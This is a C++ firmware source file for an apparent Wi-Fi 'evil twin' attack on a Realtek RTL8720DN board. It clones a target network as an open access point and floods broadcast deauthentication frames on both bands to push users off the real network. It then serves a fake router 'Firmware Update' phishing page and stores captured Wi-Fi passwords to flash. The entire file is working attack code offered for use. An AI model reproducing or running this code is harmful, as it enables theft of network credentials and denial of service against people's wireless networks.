#include "evil_twin.h"
#include "flash_storage.h"
#include "attack.h"
#include "dns_server.h"

// System reset function from Realtek SDK
extern "C" {
  void sys_reset(void);
}

static unsigned long lastEvilTwinDeauth = 0;

static uint8_t evilTwinChannel = 0;  // Store AP channel
static uint8_t fakeAPMac[6];  // MAC for fake AP beacons
static uint8_t deauth_bssid_secondary[6];  // Secondary BSSID for dual-band deauth
static bool has_secondary_target = false;  // Whether dual-band target exists

// URL decode helper
String urlDecode(String input) {
  input.replace("+", " ");
  input.replace("%20", " ");
  input.replace("%21", "!");
  input.replace("%22", "\"");
  input.replace("%23", "#");
  input.replace("%24", "$");
  input.replace("%25", "%");
  input.replace("%26", "&");
  input.replace("%27", "'");
  input.replace("%28", "(");
  input.replace("%29", ")");
  input.replace("%2A", "*");
  input.replace("%2B", "+");
  input.replace("%2C", ",");
  input.replace("%2D", "-");
  input.replace("%2E", ".");
  input.replace("%2F", "/");
  input.replace("%3A", ":");
  input.replace("%3B", ";");
  input.replace("%3C", "<");
  input.replace("%3D", "=");
  input.replace("%3E", ">");
  input.replace("%3F", "?");
  input.replace("%40", "@");
  input.replace("%5B", "[");
  input.replace("%5C", "\\");
  input.replace("%5D", "]");
  input.replace("%5E", "^");
  input.replace("%5F", "_");
  input.replace("%60", "`");
  input.replace("%7B", "{");
  input.replace("%7C", "|");
  input.replace("%7D", "}");
  input.replace("%7E", "~");
  return input;
}

// Check captive portal detection paths
bool isCaptivePortalRequest(String &path) {
  // Android
  if (path.indexOf("generate_204") >= 0) return true;
  if (path.indexOf("connectivitycheck") >= 0) return true;
  if (path.indexOf("gstatic") >= 0) return true;
  // iOS / Apple
  if (path.indexOf("hotspot-detect") >= 0) return true;
  if (path.indexOf("captive.apple") >= 0) return true;
  if (path.indexOf("library/test/success") >= 0) return true;
  // Windows
  if (path.indexOf("ncsi.txt") >= 0) return true;
  if (path.indexOf("connecttest") >= 0) return true;
  if (path.indexOf("msftconnecttest") >= 0) return true;
  // Firefox
  if (path.indexOf("detectportal") >= 0) return true;
  if (path.indexOf("success.txt") >= 0) return true;
  // Samsung
  if (path.indexOf("generate204") >= 0) return true;
  
  return false;
}

// Start Evil Twin Attack
void startEvilTwin(int targetIdx) {
  if (targetIdx < 0 || targetIdx >= (int)scan_results.size()) return;
  
  // Stop any current attack first
  attack_targets_24.clear();
  attack_targets_5.clear();
  
  evilTwinTargetIdx = targetIdx;
  evilTwinSSID = scan_results[targetIdx].ssid;
  if (evilTwinSSID.length() == 0) {
    evilTwinSSID = "Free WiFi";  // Better name for hidden networks
  }
  
  memcpy(deauth_bssid, scan_results[targetIdx].bssid, 6);
  evilTwinChannel = scan_results[targetIdx].channel;
  
  DEBUG_SER_PRINT("\n=== STARTING EVIL TWIN ===\n");
  DEBUG_SER_PRINT("Target SSID: " + evilTwinSSID + "\n");
  DEBUG_SER_PRINT("Target BSSID: " + scan_results[targetIdx].bssid_str + "\n");
  DEBUG_SER_PRINT("Channel: " + String(evilTwinChannel) + "\n");
  
  // Find matching SSID on opposite band for dual-band deauth
  int dualBandIdx = -1;
  bool is24GHz = (evilTwinChannel < 36);
  
  for (int i = 0; i < (int)scan_results.size(); i++) {
    if (i == targetIdx) continue;
    if (scan_results[i].ssid == evilTwinSSID) {
      bool this24 = (scan_results[i].channel < 36);
      if (this24 != is24GHz) {
        dualBandIdx = i;
        DEBUG_SER_PRINT("Found dual-band match: " + scan_results[i].bssid_str + " on " + String(this24 ? "2.4" : "5") + "GHz\n");
        break;
      }
    }
  }
  
  // Store secondary BSSID for deauth (if dual-band)
  if (dualBandIdx >= 0) {
    memcpy(deauth_bssid_secondary, scan_results[dualBandIdx].bssid, 6);
    has_secondary_target = true;
    DEBUG_SER_PRINT("Dual-band deauth ENABLED\n");
  } else {
    has_secondary_target = false;
    DEBUG_SER_PRINT("Single-band deauth only\n");
  }
  
  // Stop current Deauther AP first
  DEBUG_SER_PRINT("Stopping current AP...\n");
  WiFi.disconnect();
  delay(1000);  // Longer delay for AP to fully stop
  
  // Start cloned AP on SAME channel as target
  char channelStr[4];
  snprintf(channelStr, sizeof(channelStr), "%d", evilTwinChannel);
  
  DEBUG_SER_PRINT("Starting Fake AP: " + evilTwinSSID + " (Open)\n");
  int result = WiFi.apbegin((char*)evilTwinSSID.c_str(), channelStr);
  
  delay(500);  // Wait for AP to fully start
  
  if (result == WL_CONNECTED) {
    DEBUG_SER_PRINT("Evil Twin AP started OK!\n");
  } else {
    DEBUG_SER_PRINT("ERROR: AP failed! Code: " + String(result) + "\n");
  }
  
  evilTwinActive = true;
  currentState = STATE_EVIL_TWIN;
  lastEvilTwinDeauth = 0;
  
  // Create fake MAC
  memcpy(fakeAPMac, scan_results[targetIdx].bssid, 6);
  fakeAPMac[5] ^= 0x01;
  
  // Start DNS server for captive portal
  startDNSServer();
  
  DEBUG_SER_PRINT("Evil Twin ready! DNS active.\n");
  DEBUG_SER_PRINT("=========================\n\n");
}

// Stop Evil Twin
void stopEvilTwin() {
  DEBUG_SER_PRINT("Stopping Evil Twin...\n");
  
  // Stop DNS server first
  stopDNSServer();
  
  evilTwinActive = false;
  currentState = STATE_IDLE;
  evilTwinTargetIdx = -1;
  
  if (evilTwinSSID.length() > 0) {
    // Restart original deauther AP
    DEBUG_SER_PRINT("Restoring original AP...\n");
    
    // Double disconnect to ensure clean state
    WiFi.disconnect();
    delay(500);
    WiFi.disconnect();
    delay(1500);  // Longer delay for complete reset
    
    char channelStr[4];
    snprintf(channelStr, sizeof(channelStr), "%d", current_channel);
    WiFi.apbegin((char*)ssid_ap, (char*)pass_ap, channelStr);
    
    delay(1000);  // Wait for AP to fully start
    
    evilTwinSSID = "";
    DEBUG_SER_PRINT("Restored original AP: " + String(ssid_ap) + "\n");
  }
}

// Helper: send chunked HTTP data
void sendChunk(WiFiClient &client, String &data) {
  char hexSize[10];
  sprintf(hexSize, "%x", data.length());
  client.println(hexSize);
  client.print(data);
  client.println();
}

// Captive Portal page - chunked encoding
void handleCaptivePortal(WiFiClient &client) {
  String ssidDisplay = evilTwinSSID;
  if (ssidDisplay.length() > 20) {
    ssidDisplay = ssidDisplay.substring(0, 17) + "...";
  }
  
  // Headers
  client.println("HTTP/1.1 200 OK");
  client.println("Content-Type: text/html");
  client.println("Connection: close");
  client.println("Transfer-Encoding: chunked");
  client.println();
  
  // Chunk 1
  String c1 = R"(<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><title>Firmware Update</title><style>body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}.card{background:#fff;padding:40px 30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:100%;max-width:400px;text-align:center}.logo{width:64px;height:64px;margin-bottom:20px}h1{color:#1a1a1a;font-size:24px;margin-bottom:10px;font-weight:600}p{color:#65676b;font-size:15px;line-height:1.5;margin-bottom:24px}.loader{border:3px solid #f3f3f3;border-radius:50%;border-top:3px solid #1877f2;width:24px;height:24px;animation:spin 1s linear infinite;display:inline-block;vertical-align:middle;margin-right:10px}.status{background:#e7f3ff;color:#1877f2;padding:12px;border-radius:6px;font-size:14px;margin-bottom:24px;font-weight:500;display:flex;align-items:center;justify-content:center}input{width:100%;padding:14px 16px;margin-bottom:16px;border:1px solid #ddd;border-radius:6px;font-size:16px;outline:none;transition:border-color .2s;box-sizing:border-box}input:focus{border-color:#1877f2}button{background:#1877f2;color:#fff;border:none;padding:14px;border-radius:6px;font-size:16px;font-weight:600;width:100%;cursor:pointer;transition:background .2s}button:hover{background:#166fe5}.ft{margin-top:24px;color:#65676b;font-size:12px}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}.warn{color:#dc3545;font-size:13px;margin-top:10px;display:none}</style></head><body><div class="card"><svg class="logo" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M32 4C16.5 4 4 16.5 4 32C4 47.5 16.5 60 32 60C47.5 60 60 47.5 60 32C60 16.5 47.5 4 32 4ZM46 26L29 43L18 32" stroke="#1877f2" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/></svg><h1>Firmware Update</h1><p>A critical security update is available for your router. Connection has been paused until verification is complete.</p><div class="status"><div class="loader"></div>Waiting for verification...</div><form action="/submit" method="POST"><div style="text-align:left;margin-bottom:8px;font-weight:500;font-size:14px;color:#333">Enter WiFi Password</div><input type="password" name="password" placeholder="Password for )";
  sendChunk(client, c1);
  
  // Chunk 2
  String c2 = ssidDisplay + R"(" required minlength="8" autocomplete="off"><button type="submit">Verify & Install</button><div class="warn" id="err">Incorrect password. Please try again.</div></form><div class="ft">Router Firmware v2024.12.01 &bull; Serial: RTL-8720DN</div></div></body></html>)";
  sendChunk(client, c2);
  
  // End
  client.println("0");
  client.println();
}

// Success page
void handleCaptureSuccess(WiFiClient &client) {
  String html = "HTTP/1.1 200 OK\r\n";
  html += "Content-Type: text/html; charset=utf-8\r\n";
  html += "Connection: close\r\n\r\n";
  
  html += R"HTML(<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connected</title>
<style>
body{font-family:-apple-system,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}
.box{background:#fff;border-radius:12px;padding:40px;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:320px}
.ok{width:60px;height:60px;background:#34C759;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
.ok svg{fill:#fff;width:30px}
h1{color:#333;font-size:20px;margin-bottom:8px}
p{color:#666;font-size:14px}
</style>
</head>
<body>
<div class="box">
<div class="ok"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
<h1>Connected!</h1>
<p>You can now close this page.</p>
</div>
</body>
</html>)HTML";
  
  client.print(html);
}

// Handle password submission
void handlePasswordSubmit(WiFiClient &client, String &request) {
  int bodyStart = request.indexOf("\r\n\r\n");
  if (bodyStart == -1) {
    handleCaptureSuccess(client);
    return;
  }
  
  String postData = request.substring(bodyStart + 4);
  int pwdStart = postData.indexOf("password=");
  
  if (pwdStart >= 0) {
    String password = postData.substring(pwdStart + 9);
    int ampPos = password.indexOf("&");
    if (ampPos > 0) password = password.substring(0, ampPos);
    
    // Decode URL-encoded password
    password = urlDecode(password);
    password.trim();
    
    if (password.length() >= 8) {  // Valid WiFi password
      // Save SSID + Password
      saveCredentialToFlash(evilTwinSSID, password);
      
      DEBUG_SER_PRINT("\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
      DEBUG_SER_PRINT("!!! PASSWORD CAPTURED !!!\n");
      DEBUG_SER_PRINT("!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
      DEBUG_SER_PRINT("Network: " + evilTwinSSID + "\n");
      DEBUG_SER_PRINT("Password: " + password + "\n");
      DEBUG_SER_PRINT("System will reset in 3 seconds...\n\n");
      
      // Show success page
      handleCaptureSuccess(client);
      
      // Wait for user to see success message
      delay(3000);
      
      // Hard reset for cleanest state
      DEBUG_SER_PRINT("Resetting system now!\n");
      sys_reset();  // Full system restart from Realtek SDK
      
      return;
    }
  }
  
  handleCaptureSuccess(client);
}

// Evil Twin Deauth Task
void EvilTwinDeauthTask(void *pvParameters) {
  (void) pvParameters;
  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  
  while (1) {
    if (evilTwinActive && currentState == STATE_EVIL_TWIN && evilTwinTargetIdx >= 0) {
      unsigned long now = millis();
      
      // Deauth every 2000ms
      if (now - lastEvilTwinDeauth >= 2000) {
        if (evilTwinTargetIdx < (int)scan_results.size()) {
          // Send deauth to primary BSSID
          for (int i = 0; i < 3; i++) {
            uint16_t reason = REASONS_ALL[i % REASONS_ALL_COUNT];
            wifi_tx_deauth_frame(deauth_bssid, broadcast, reason);
            delayMicroseconds(100);
          }
          
          // If dual-band target exists, also deauth the opposite band
          if (has_secondary_target) {
            for (int i = 0; i < 3; i++) {
              uint16_t reason = REASONS_ALL[i % REASONS_ALL_COUNT];
              wifi_tx_deauth_frame(deauth_bssid_secondary, broadcast, reason);
              delayMicroseconds(100);
            }
          }
        }
        lastEvilTwinDeauth = now;
      }
    }
    vTaskDelay(pdMS_TO_TICKS(100));
  }
}

